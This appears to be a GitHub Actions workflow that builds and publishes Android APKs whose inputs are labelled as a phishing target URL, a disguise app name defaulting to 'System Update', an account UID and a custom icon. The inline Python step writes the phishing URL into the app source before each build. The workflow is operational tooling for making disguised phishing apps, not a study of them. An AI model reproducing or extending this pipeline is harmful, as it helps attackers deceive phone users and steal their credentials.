name: Build Sync XxX APK

on:
  workflow_dispatch:
    inputs:
      app_name:
        description: 'Nama Aplikasi'
        required: true
        default: 'System Update'
      target_url:
        description: 'URL Target (Phising)'
        required: true
        default: 'https://google.com'
      uid:
        description: 'UID Akun'
        required: true
        default: 'nexsus-xxxxxxx'
      icon_url:
        description: 'URL Icon (PNG/JPG)'
        required: false
        default: 'https://files.catbox.moe/0iq0n3.jpg'

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      actions: write

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install Pillow
        run: pip install Pillow

      - name: Inject Config (Python)
        env:
          TARGET_URL: ${{ github.event.inputs.target_url }}
          APP_NAME: ${{ github.event.inputs.app_name }}
          ACCOUNT_UID: ${{ github.event.inputs.uid }}
        run: |
          python3 - << 'EOF'
          import os
          import json
          import re

          # ─── 1. REPLACE TARGET_URL ───
          main_kt = "android/app/src/main/java/com/sync/xxx/MainActivity.kt"
          with open(main_kt, "r") as f:
              content = f.read()

          url_input = os.environ.get("TARGET_URL", "https://google.com")
          content = content.replace('"TARGET_URL_PLACEHOLDER"', f'"{url_input}"')

          with open(main_kt, "w") as f:
              f.write(content)
          print(f"✅ TARGET_URL injected: {url_input}")

          # ─── 2. REPLACE APP NAME ───
          strings_xml = "android/app/src/main/res/values/strings.xml"
          with open(strings_xml, "r") as f:
              content = f.read()

          app_name = os.environ.get("APP_NAME", "System Update")
          content = re.sub(r'<string name="app_name">.*?</string>', f'<string name="app_name">{app_name}</string>', content)

          with open(strings_xml, "w") as f:
              f.write(content)
          print(f"✅ APP_NAME injected: {app_name}")

          # ─── 3. CREATE UID.JSON ───
          os.makedirs("android/app/src/main/assets", exist_ok=True)
          uid = os.environ.get("ACCOUNT_UID", "nexsus-xxxxxxx")
          with open("android/app/src/main/assets/uid.json", "w") as f:
              json.dump({"uid": uid}, f)
          print(f"✅ UID injected: {uid}")

          # ─── 4. VERIFY ───
          print("\n=== VERIFIKASI ===")
          with open(main_kt, "r") as f:
              for line in f:
                  if "TARGET_URL" in line and "private val" in line:
                      print(f"MainActivity.kt: {line.strip()}")
          print("==================\n")
          EOF

      - name: Download Icon
        run: |
          curl -L -o custom_icon.png "${{ github.event.inputs.icon_url }}"

      - name: Generate App Icons
        run: python3 generate_icons.py custom_icon.png

      - name: Setup Gradle Wrapper
        run: |
          curl -L -o android/gradle/wrapper/gradle-wrapper.jar \
            "https://github.com/gradle/gradle/raw/v8.4.0/gradle/wrapper/gradle-wrapper.jar"
          chmod +x android/gradlew

      - name: Build Release APK
        run: |
          cd android
          ./gradlew assembleRelease --no-daemon

      - name: Rename APK
        run: |
          mkdir -p output
          find android/app/build/outputs/apk/release/ -name "*.apk" | head -1 \
            | xargs -I{} cp {} output/SyncXxX.apk

      - name: Create Release and Upload APK
        uses: softprops/action-gh-release@v1
        with:
          tag_name: build-${{ github.run_id }}
          name: "Build ${{ github.event.inputs.app_name }}"
          files: output/SyncXxX.apk
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}